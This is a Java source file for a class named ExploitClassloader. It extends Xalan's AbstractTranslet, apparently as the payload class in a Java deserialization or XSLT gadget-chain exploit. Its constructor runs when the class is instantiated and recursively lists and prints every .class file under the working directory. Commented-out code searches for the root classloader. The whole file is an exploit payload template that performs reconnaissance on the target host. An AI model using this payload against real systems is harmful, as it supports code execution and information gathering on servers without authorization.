import java.io.File;
import java.net.URI;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

public class ExploitClassloader extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

	public ExploitClassloader() throws Exception {
		super.transletVersion = CURRENT_TRANSLET_VERSION;

		// ClassLoader classLoader = ExploitClassloader.class.getClassLoader();
		// while (classLoader != null && classLoader.getParent() != null) {
		// classLoader = classLoader.getParent();
		// System.out.println("Getting parent");
		// }
		// System.out.println("Done with class loader finding");
		//
		// URI rootUri = classLoader.getResource(".").toURI();
		// Path rootDir = Paths.get(rootUri);
		dirTree(new File("."));
	}

	public static void dirTree(File dir) {
		File[] subdirs = dir.listFiles();
		for (File subdir : subdirs) {
			if (subdir.isDirectory()) {
				dirTree(subdir);
			} else if (getFileExtension(subdir).equals(".class")) {
				doFile(subdir);
			}
		}
	}

	private static String getFileExtension(File file) {
		String name = file.getName();
		int lastIndexOf = name.lastIndexOf(".");
		if (lastIndexOf == -1) {
			return ""; // empty extension
		}
		return name.substring(lastIndexOf);
	}

	public static void doFile(File file) {
		System.out.println(Paths.get(file.getAbsolutePath()).normalize());
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {
	}
}
